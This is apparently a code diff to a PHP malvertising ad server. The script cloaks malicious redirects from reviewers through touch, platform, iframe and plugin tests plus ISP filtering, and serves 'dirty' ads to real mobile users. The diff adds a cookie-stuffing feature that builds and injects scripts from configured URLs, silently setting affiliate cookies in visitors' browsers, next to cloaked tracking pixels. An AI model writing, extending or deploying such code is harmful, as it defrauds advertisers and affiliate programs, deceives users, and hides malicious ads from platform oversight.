@@ -23,7 +23,12 @@
 	//
 
 	require_once("include/adlib.inc");
-	require_once("include/databasehelpers.inc");
+
+	// If file doesn't exist, auto de-activate database functionality by checking for isset($mysqli)
+	if (file_exists("include/databasehelpers.inc"))
+	{
+		require_once("include/databasehelpers.inc");
+	}
 
 	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
 												 "T-Mobile USA",
@@ -110,11 +115,11 @@
 
 	function detectMobileOS()
 	{
-		 $osArray = array("/iphone/i"	=>  "iOS",
-	                      "/ipod/i"		=>  "iOS",
-	                      "/ipad/i"		=>  "iOS",
-	                      "/android/i"	=>  "Android"
-		                 );
+		$osArray = array("/iphone/i"	=>  "iOS",
+	                     "/ipod/i"		=>  "iOS",
+	                     "/ipad/i"		=>  "iOS",
+	                     "/android/i"	=>  "Android"
+		                );
 
 	    foreach ($osArray as $regex => $value)
 	    { 
@@ -413,6 +418,8 @@
 	$redirectSubMethod2				= array_key_exists("RedirectSubMethod2", $adConfig) ? $adConfig["RedirectSubMethod2"] : "";
 	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig["RedirectTimeout"] : 3000;
 	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] === "false" ? false : true;
+	$cookieStuffingUrls				= array_key_exists("CookieStuffingUrls", $adConfig) ? json_decode($adConfig["CookieStuffingUrls"]) : array();
+	$cookieStuffingEnabled			= !emptyArrayValues($cookieStuffingUrls);
 	$voluumCampaignID				= array_key_exists("VoluumCampaignID", $adConfig) ? $adConfig["VoluumCampaignID"] : "";
 	$voluumTotalAds					= array_key_exists("VoluumTotalAds", $adConfig) ? $adConfig["VoluumTotalAds"] : -1;
 	$voluumAdDisplayCap				= array_key_exists("VoluumAdDisplayCap", $adConfig) ? $adConfig["VoluumAdDisplayCap"] : -1;
@@ -731,6 +738,9 @@
 					            return topDomain;
 						     }";
 
+	///////////////////////////////////////////////////
+	// Build Tracking Pixel Script
+	///////////////////////////////////////////////////
 	if ($trackingPixelEnabled && !empty($trackingPixelUrl))
 	{
 		// Append referrer
@@ -739,6 +749,9 @@
 		$trackingPixelScript = getTrackingPixelCode("addTrackingPixel", $trackingPixelUrl);
 	}
 
+	///////////////////////////////////////////////////
+	// Build Cloak Tracking Pixel Script
+	///////////////////////////////////////////////////
 	if ($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl))
 	{
 		if (!empty($trackingPixelCloakTestParameters))
@@ -754,6 +767,22 @@
 		$cloakTrackingPixelScript = getTrackingPixelCode("addCloakTrackingPixel", $cloakTrackingPixelUrl, 
 			"(typeof testResults != 'undefined' ? ('&' + (testResults.isTouchTest ? 'touchSuccess=' + encodeURIComponent(getReferrerDomain()) : 'touchFailed=' + encodeURIComponent(getReferrerDomain())) + '&' + (testResults.platformTest ? 'platformSuccess=' + window.navigator.platform : 'platformFailed=' + window.navigator.platform)) : '')");
 	}
+
+	///////////////////////////////////////////////////
+	// Build Cookie Stuffing Script
+	///////////////////////////////////////////////////
+	if (!empty($cookieStuffingUrls))
+	{
+		$cookieStuffingScript = "";
+
+		foreach ($cookieStuffingUrls as $url)
+		{
+			if (!empty($url))
+			{
+				$cookieStuffingScript .= getCookieStuffingCode($url) . "\n";
+			}
+		}
+	}	
 
 	if (($serveCleanAd || !$redirectEnabled) && !$forceDirtyAd)
 	{
@@ -777,6 +806,11 @@
 		{
 			$scriptElements[] = minify("<script type=\"text/javascript\">" . $cloakTrackingPixelScript . "</script>");
 			$onloadElements[] = "addCloakTrackingPixel();";			
+		}
+
+		if (!empty($cookieStuffingUrls))
+		{
+			$scriptElements[] = minify("<script type=\"text/javascript\">" . $cookieStuffingScript . "</script>");
 		}
 
 		if ($trafficLoggerEnabled)
@@ -813,14 +847,13 @@
 
 		if ($voluumTotalAds > 0 && $voluumAdDisplayCap > 0)
 		{
-			if ($voluumCampaignID != "")
+			if ($voluumCampaignID != "" && isset($mysqli))
 			{
 				connectDatabase();
 
 				$availableAdIndices = range(1, $voluumTotalAds); // 1...n
 
 				$stmt = $mysqli->prepare("SELECT * FROM voluumconversions WHERE voluumcampaignid = ? AND ccid = ?");
-				echo $mysqli->error;
 				$stmt->bind_param("ss", $voluumCampaignID, $adVisitorID);
 				$stmt->execute();
 
@@ -908,6 +941,7 @@
 
 						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
 						($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl) ? $cloakTrackingPixelScript : "") .
+						(!empty($cookieStuffingUrls) ? $cookieStuffingScript : "") .
 
 					   	($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
 			   			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
